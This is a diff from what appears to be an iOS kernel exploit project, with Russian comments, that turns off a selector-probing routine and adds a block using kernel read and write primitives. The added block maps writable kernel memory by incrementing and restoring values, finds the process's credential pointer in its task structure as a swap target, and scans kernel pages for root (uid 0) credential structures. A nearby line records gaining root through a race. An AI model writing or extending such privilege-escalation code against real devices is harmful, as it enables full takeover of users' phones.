@@ -8070,12 +8070,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         if (fp) { fputs("root via UUNLOCK-RACE v3\n", fp); fclose(fp); }
                     }
                 }
-                // kexproofv2 2.0.27 [SELPROBE] — confused-deputy hunt. Каждому
-                // селектору M2Scaler/JPEGDriver скармливаем KVA НАШЕЙ scratch-
-                // страницы (маркер 0xA11C1000DEADBEEF) в struct и scalar.
-                // Если селектор пишет по юзер-указателю — маркер меняется ★.
-                // Единственный показанный ядру адрес — наша собственная страница.
-                {
+                // kexproofv2 2.0.27 [SELPROBE] — confused-deputy hunt. ВЫКЛ (2.0.28):
+                // какой-то селектор M2Scaler роняет приложение. Код остаётся для
+                // ручного запуска.
+                if (0) {
                     kpNote(r, @"  [SELPROBE] старт: аудит селекторов M2Scaler/JPEGDriver на запись по указателю");
                     uint8_t *scratch = valloc(0x4000);
                     uint64_t mkVA = 0, mkPA = 0;
@@ -8136,6 +8134,74 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     if (scratch) { munlock(scratch, 0x4000); free(scratch); }
                     kpNote(r, @"  [SELPROBE] финиш");
+                }
+                // kexproofv2 2.0.28 [WRIMAP] — карта пишущегося ядра нашим
+                // мирным инструментом (kread/kwrite/walker), без селекторов:
+                //  (A) матрица пишущести типов кадров (RMW+1→restore);
+                //  (B) кэш cred в selfTask (тип 0x21 = пишущийся!);
+                //  (C) охота за ROOT cred — uid=0 ucred среди 98 кадров типа 0x18.
+                {
+                    kpNote(r, @"  [WRIMAP] старт: карта пишущегося ядра");
+                    // --- A: тип-матрица ---
+                    int wTypes[7] = { 0x0b, 0x0e, 0x21, 0x13, 0x11, 0x17, 0x37 };
+                    for (int wi = 0; wi < 7; wi++) {
+                        int t = wTypes[wi];
+                        uint64_t tp = 0;
+                        for (uint64_t i = (0x40000000ULL >> 14); i < nF; i++) {
+                            uint64_t pa = pB + (i << 14);
+                            if (kpFrameTypeOf(pa) == t) { tp = pa; break; }
+                        }
+                        if (!tp) { kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: кадров ≥256MB не найдено", t]); continue; }
+                        uint64_t al = phystokv(tp);
+                        if (!al) continue;
+                        uint64_t v0 = early_kread64(al + 0x100);
+                        early_kwrite64(al + 0x100, v0 + 1);
+                        uint64_t v1 = early_kread64(al + 0x100);
+                        early_kwrite64(al + 0x100, v0);
+                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: pa=%#llx %#llx→%#llx — %@",
+                                  t, (unsigned long long)tp, (unsigned long long)v0, (unsigned long long)v1,
+                                  v1 == v0 + 1 ? @"ПИШЕТСЯ ★" : @"RO"]);
+                    }
+                    // --- B: selfTask — ищем указатели на наш cred/label ---
+                    uint64_t stVA = task_self();
+                    if (kpLooksLikeKernelPointer(stVA)) {
+                        NSMutableString *th = [NSMutableString string];
+                        uint32_t credPtrOff = 0xFFFFFFFF;
+                        for (uint32_t o = 0; o < 0x400; o += 8) {
+                            uint64_t q = early_kread64(stVA + o);
+                            if (q == ucF || q == kp_untag_ptr(early_kread64(ucF + 0x00)) ||
+                                q == kp_untag_ptr(early_kread64(ucF + 0x78))) {
+                                if (credPtrOff == 0xFFFFFFFF) credPtrOff = o;
+                                [th appendFormat:@" ★+%x=%#llx", o, (unsigned long long)q];
+                            }
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] selfTask=%#llx: cred/label-указатели:%@",
+                                  (unsigned long long)stVA, th.length ? th : @" нет (cred кэша в task нет)"]);
+                        if (credPtrOff != 0xFFFFFFFF)
+                            kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ★★ task+%#x держит наш cred/label — task пишется (0x21), свап-кандидат!",
+                                      credPtrOff]);
+                    }
+                    // --- C: ROOT cred — uid=0 ucred в типе 0x18 ---
+                    uint32_t rootCands = 0;
+                    for (uint64_t i = 0; i < nF && rootCands < 8; i++) {
+                        uint64_t pa = pB + (i << 14);
+                        if (kpFrameTypeOf(pa) != 0x18) continue;
+                        uint64_t al = phystokv(pa);
+                        if (!al) continue;
+                        for (uint32_t o = 0; o + 0x80 < 0x4000; o += 0x10) {
+                            uint32_t uidAt = (uint32_t)early_kread64(al + o + 0x18);
+                            if (uidAt != 0) continue;
+                            uint64_t rwAt = early_kread64(al + o + 0x00);
+                            if (!kpLooksLikeKernelPointer(rwAt)) continue;
+                            uint64_t lbAt = early_kread64(al + o + 0x78);
+                            if (!kpLooksLikeKernelPointer(lbAt) && lbAt != 0) continue;
+                            rootCands++;
+                            kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ★ ROOT-cred кандидат[%u]: pa=%#llx uoff=%#x rw=%#llx label=%#llx",
+                                      rootCands, (unsigned long long)pa, o,
+                                      (unsigned long long)rwAt, (unsigned long long)lbAt]);
+                        }
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] финиш: ROOT-кандидатов %u", rootCands]);
                 }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
                 // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
